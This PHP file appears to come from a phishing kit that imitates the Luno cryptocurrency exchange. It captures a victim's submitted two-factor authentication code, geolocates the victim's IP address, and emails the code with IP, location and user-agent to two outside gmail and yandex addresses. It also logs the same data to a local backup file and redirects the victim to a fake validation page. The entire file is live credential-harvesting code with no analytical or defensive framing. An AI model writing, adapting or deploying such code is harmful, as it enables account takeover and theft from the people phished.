<?php

$name = $_POST['2factor'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];



$email_body = "==========================START=================================== \n";
$email_body .= "3rd Two-Factor Auth::=>       $name  \n";
$email_body .= 	"IP: {$geoplugin->ip}  \n";
$email_body .= 	"City: {$geoplugin->city}  \n";
$email_body .= 	"Region: {$geoplugin->region}  \n";
$email_body .= 	"Country Name: {$geoplugin->countryName}  \n";
$email_body .= 	"Country Code: {$geoplugin->countryCode}  \n";
$email_body .= 	"User-Agent: ".$browser."  \n";
$email_body .= "Date Log  : ".$date."  \n";
$email_body .= "Time Log  : ".$time." \n";
$email_body .= "==========================END=================================== \n";
 
$email_from = "Luno 5th <support@".$_SERVER['HTTP_HOST'].">"; //<== update the email address
$email_subject = "[$geoplugin->ip] 3rd 2FA EN | [$name]";
 
$to = "lunover463@gmail.com,luno11ver@yandex.com";//<== update the email address
$headers = "From: $email_from \r\n";
//Send the email!
mail($to,$email_subject,$email_body,$headers);


//done. redirect to thank-you page.

header("Location: validating_pros.php");

$fp = fopen("backup.txt","a");
fputs($fp,$email_body);
fclose($fp);

// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}
   
?> 
